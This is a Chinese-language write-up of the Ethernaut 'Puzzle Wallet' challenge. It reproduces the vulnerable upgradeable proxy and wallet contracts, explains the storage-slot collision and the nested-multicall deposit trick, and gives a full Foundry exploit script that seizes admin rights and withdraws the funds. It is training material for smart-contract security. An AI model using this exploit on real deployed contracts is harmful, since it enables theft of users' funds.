# Level 24 - Puzzle Wallet
## 題目
[Puzzle Wallet](https://ethernaut.openzeppelin.com/level/0x725595BA16E76ED1F6cC1e1b65A88365cC494824)

### 通關條件
事實上，如今，為 DeFi 作業付費是不可能的。
一群朋友發現瞭如何透過將多筆交易批量處理為一筆交易來稍微降低執行多筆交易的成本，因此他們開發了一個智能合約來實現這一點。
他們需要該合約能夠升級，以防程式碼包含錯誤，並且他們還希望防止組外的人使用它。為此，他們投票並分配了兩個在系統中具有特殊角色的人：管理員，有權更新智能合約的邏輯。所有者，控制允許使用合約的地址白名單。合約已部署，該組已列入白名單。每個人都為自己對抗邪惡礦工的成就而歡呼。
他們殊不知，他們的午餐錢正處於危險之中…
您需要劫持此錢包才能成為代理的管理員。
### 提示
- 了解執行一項操作時如何delegatecall運作以及如何msg.sender表現msg.value。
- 了解代理模式及其處理儲存變數的方式。
### 合約內容
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```
## 解題
這題牽扯到 Proxy Contract，建議先看完 [WTF Solidity极简入门: 46. 代理合约
](https://github.com/AmazingAng/WTF-Solidity/tree/main/46_ProxyContract)

這題可以看到代理合約跟邏輯合約的變數宣告不一致，storage slot 會產生衝突。所以我們只要透過 `proposeNewAdmin()`（23 行）修改代理合約的 `pendingAdmin`，就會因為 slot 衝突進而修改到 `PuzzleWallet` 的 `owner`（都是第一個宣告的變數）。順利取得 `PuzzleWallet` 的 owner 權限。
```solidity
level24Proxy.proposeNewAdmin(msg.sender);
```
接下來就是要奪取 `PuzzleProxy` 的 admin 權限。跟剛剛一樣，我們的目標是修改 `PuzzleWallet` 的 `maxBalance` 讓 admin 跟著一起改變。改變 `maxBalance` 的 function 在第 54 行，要先通過 modifier `onlyWhitelisted()`，所以要把自己加入到白名單中，透過 59 行的 `addToWhitelist()`。
接下來要通過 55 行的 `require(address(this).balance == 0)`，必須將合約中的幣題光，合約中有 0.001 eth，雖然 `execute()` 可以提款但是只能提取自己存進去的 eth，所以現在要想辦法讓自己在 `PuzzleWallet` 中的錢顯示 0.002 但其實只有存入 0.001。
這裡要用到合約中最後的 function `multicall(bytes[] calldata data)`（76 行），他會將參數 `data[]` 中存入的 function 逐一執行，所以我們只要 `[deposit, [multicall, deposit]]` 就可以實現只放入 0.001 但執行兩次 `deposit()` 的效果。
```solidity
bytes[] memory depositSelector = new bytes[](1);
depositSelector[0] = abi.encodeWithSelector(level24Wallet.deposit.selector);
bytes[] memory nestedMulticall = new bytes[](2);
nestedMulticall[0] = abi.encodeWithSelector(level24Wallet.deposit.selector);
nestedMulticall[1] = abi.encodeWithSelector(level24Wallet.multicall.selector, depositSelector);
level24Wallet.addToWhitelist(msg.sender);
level24Wallet.multicall{value: 0.001 ether}(nestedMulticall);
level24Wallet.execute(msg.sender, 0.002 ether, "");
level24Wallet.setMaxBalance(uint256(uint160(msg.sender)));
```
關於 MultiCall 也可以參考 [WTF Solidity极简入门: 55. 多重调用
](https://github.com/AmazingAng/WTF-Solidity/blob/main/55_MultiCall/readme.md)。最後攻擊合約如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/24_PuzzleWallet.sol";

contract ExploitScript is Script {
    PuzzleProxy level24Proxy = PuzzleProxy(payable(your_challenge_address));
    PuzzleWallet level24Wallet = PuzzleWallet(payable(your_challenge_address));
    
    function run() external {
        vm.startBroadcast();

        level24Proxy.proposeNewAdmin(msg.sender);

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(level24Wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(level24Wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(level24Wallet.multicall.selector, depositSelector);
        level24Wallet.addToWhitelist(msg.sender);
        level24Wallet.multicall{value: 0.001 ether}(nestedMulticall);
        level24Wallet.execute(msg.sender, 0.002 ether, "");
        level24Wallet.setMaxBalance(uint256(uint160(msg.sender)));

        vm.stopBroadcast();
    }
}
```
